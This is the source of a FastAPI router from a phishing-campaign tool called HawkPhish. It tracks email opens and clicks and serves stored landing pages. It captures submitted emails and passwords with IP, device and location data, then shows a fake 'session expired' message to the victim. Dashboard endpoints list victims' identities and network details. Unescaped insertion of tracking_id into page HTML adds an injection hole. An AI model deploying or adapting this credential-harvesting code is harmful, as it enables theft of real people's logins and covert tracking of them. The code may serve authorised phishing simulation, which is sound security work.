"""HawkPhish - Tracking, Sessions & Landing Page Routes"""
from fastapi import APIRouter, Depends, Request, Form, Query
from fastapi.responses import HTMLResponse, RedirectResponse, Response
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func, desc
from database import get_db
from models import EmailLog, LandingPage, CredentialSubmit, Campaign, RecipientSession, Recipient
from services.tracking_service import TrackingService
from pydantic import BaseModel
from typing import Optional

router = APIRouter(tags=["Tracking"])


@router.get("/pixel/{tracking_id}")
async def tracking_pixel(tracking_id: str, request: Request, db: AsyncSession = Depends(get_db)):
    tracking = TrackingService(db)
    await tracking.record_open(
        tracking_id,
        user_agent=request.headers.get("user-agent", ""),
        ip_address=request.client.host if request.client else "",
        language=request.headers.get("accept-language", ""),
        referrer=request.headers.get("referer", ""),
    )
    return Response(content=tracking.get_pixel(), media_type="image/gif")


@router.get("/track/{tracking_id}")
async def tracking_redirect(tracking_id: str, request: Request, db: AsyncSession = Depends(get_db)):
    tracking = TrackingService(db)
    redirect_path = await tracking.record_click(
        tracking_id,
        user_agent=request.headers.get("user-agent", ""),
        ip_address=request.client.host if request.client else "",
        language=request.headers.get("accept-language", ""),
        referrer=request.headers.get("referer", ""),
    )
    return RedirectResponse(url=redirect_path)


@router.get("/lp/{landing_page_id}", response_class=HTMLResponse)
async def show_landing_page(landing_page_id: int, tracking_id: str = "", db: AsyncSession = Depends(get_db)):
    page = await db.get(LandingPage, landing_page_id)
    if not page:
        return HTMLResponse("<h1>Page not found</h1>", status_code=404)

    html = page.html_content or ""
    if tracking_id:
        html = html.replace("</form>", f'<input type="hidden" name="tracking_id" value="{tracking_id}"></form>')

    return HTMLResponse(html)


@router.post("/lp/{landing_page_id}/submit")
async def submit_credentials(
    landing_page_id: int,
    request: Request,
    tracking_id: str = Form(""),
    email: str = Form(""),
    password: str = Form(""),
    db: AsyncSession = Depends(get_db),
):
    tracking = TrackingService(db)
    await tracking.record_credential(
        tracking_id=tracking_id,
        email=email,
        password=password,
        user_agent=request.headers.get("user-agent", ""),
        ip_address=request.client.host if request.client else "",
        language=request.headers.get("accept-language", ""),
        referrer=request.headers.get("referer", ""),
    )

    page = await db.get(LandingPage, landing_page_id)
    if page and page.redirect_url:
        return RedirectResponse(url=page.redirect_url)

    return HTMLResponse("""
        <html><body style="font-family:sans-serif;text-align:center;padding:50px">
        <h2>Thank you</h2><p>Your session has expired. Please sign in again.</p>
        </body></html>
    """)


@router.get("/api/sessions")
async def list_sessions(
    campaign_id: Optional[int] = Query(None),
    status: Optional[str] = Query(None),
    limit: int = Query(50, le=200),
    db: AsyncSession = Depends(get_db),
):
    query = select(RecipientSession).order_by(desc(RecipientSession.last_event_at))
    if campaign_id:
        query = query.where(RecipientSession.campaign_id == campaign_id)
    if status:
        query = query.where(RecipientSession.status == status)
    query = query.limit(limit)

    result = await db.execute(query)
    sessions = result.scalars().all()
    return [{
        "id": s.id,
        "campaign_id": s.campaign_id,
        "recipient_id": s.recipient_id,
        "email": s.email,
        "status": s.status,
        "total_events": s.total_events,
        "first_event_at": s.first_event_at.isoformat() if s.first_event_at else None,
        "last_event_at": s.last_event_at.isoformat() if s.last_event_at else None,
        "ip_addresses": s.ip_addresses or [],
        "browsers": s.browsers or [],
        "devices": s.devices or [],
        "countries": s.countries or [],
        "events": s.events or [],
    } for s in sessions]


@router.get("/api/sessions/{session_id}")
async def get_session(session_id: int, db: AsyncSession = Depends(get_db)):
    session = await db.get(RecipientSession, session_id)
    if not session:
        from fastapi import HTTPException
        raise HTTPException(404, "Session not found")

    recipient = await db.get(Recipient, session.recipient_id) if session.recipient_id else None
    campaign = await db.get(Campaign, session.campaign_id) if session.campaign_id else None

    return {
        "id": session.id,
        "campaign_id": session.campaign_id,
        "campaign_name": campaign.name if campaign else "",
        "recipient_id": session.recipient_id,
        "email": session.email,
        "recipient_name": f"{recipient.first_name} {recipient.last_name or ''}".strip() if recipient else "",
        "status": session.status,
        "total_events": session.total_events,
        "first_event_at": session.first_event_at.isoformat() if session.first_event_at else None,
        "last_event_at": session.last_event_at.isoformat() if session.last_event_at else None,
        "ip_addresses": session.ip_addresses or [],
        "browsers": session.browsers or [],
        "devices": session.devices or [],
        "countries": session.countries or [],
        "events": session.events or [],
    }


@router.get("/api/live-feed")
async def live_feed(limit: int = Query(30, le=100), db: AsyncSession = Depends(get_db)):
    result = await db.execute(
        select(EmailLog)
        .where(EmailLog.status.in_(["opened", "clicked", "submitted"]))
        .order_by(desc(EmailLog.opened_at))
        .limit(limit)
    )
    logs = result.scalars().all()

    entries = []
    for log in logs:
        recipient = await db.get(Recipient, log.recipient_id) if log.recipient_id else None
        campaign = await db.get(Campaign, log.campaign_id) if log.campaign_id else None
        ts = log.submitted_at or log.clicked_at or log.opened_at
        entries.append({
            "tracking_id": log.tracking_id,
            "status": log.status,
            "email": recipient.email if recipient else "",
            "recipient_name": f"{recipient.first_name} {recipient.last_name or ''}".strip() if recipient else "",
            "campaign_name": campaign.name if campaign else "",
            "ip_address": log.ip_address or "",
            "browser": log.browser or "",
            "os": log.os or "",
            "device": log.device or "",
            "country": log.country or "",
            "city": log.city or "",
            "isp": log.isp or "",
            "time": ts.isoformat() if ts else "",
        })
    return entries


@router.get("/api/dashboard")
async def dashboard(db: AsyncSession = Depends(get_db)):
    from sqlalchemy import select as sel, func
    from models import SMTPConfig, Group, Recipient

    campaigns = await db.execute(sel(Campaign))
    campaigns_list = campaigns.scalars().all()

    total_sent = sum(c.total_sent for c in campaigns_list)
    total_opened = sum(c.total_opened for c in campaigns_list)
    total_clicked = sum(c.total_clicked for c in campaigns_list)
    total_submitted = sum(c.total_submitted for c in campaigns_list)

    smtp_count = await db.execute(sel(func.count(SMTPConfig.id)))
    group_count = await db.execute(sel(func.count(Group.id)))
    recipient_count = await db.execute(sel(func.count(Recipient.id)))

    sessions_result = await db.execute(sel(func.count(RecipientSession.id)))
    total_sessions = sessions_result.scalar() or 0

    unique_ips_result = await db.execute(
        sel(func.count(func.distinct(RecipientSession.id))).where(
            RecipientSession.ip_addresses.isnot(None)
        )
    )

    return {
        "campaigns": {
            "total": len(campaigns_list),
            "running": sum(1 for c in campaigns_list if c.status == "running"),
            "completed": sum(1 for c in campaigns_list if c.status == "completed"),
        },
        "stats": {
            "total_sent": total_sent,
            "total_opened": total_opened,
            "total_clicked": total_clicked,
            "total_submitted": total_submitted,
            "total_sessions": total_sessions,
            "open_rate": round((total_opened / total_sent * 100) if total_sent > 0 else 0, 1),
            "click_rate": round((total_clicked / total_sent * 100) if total_sent > 0 else 0, 1),
            "submit_rate": round((total_submitted / total_sent * 100) if total_sent > 0 else 0, 1),
        },
        "resources": {
            "smtp_configs": smtp_count.scalar() or 0,
            "groups": group_count.scalar() or 0,
            "recipients": recipient_count.scalar() or 0,
        },
    }
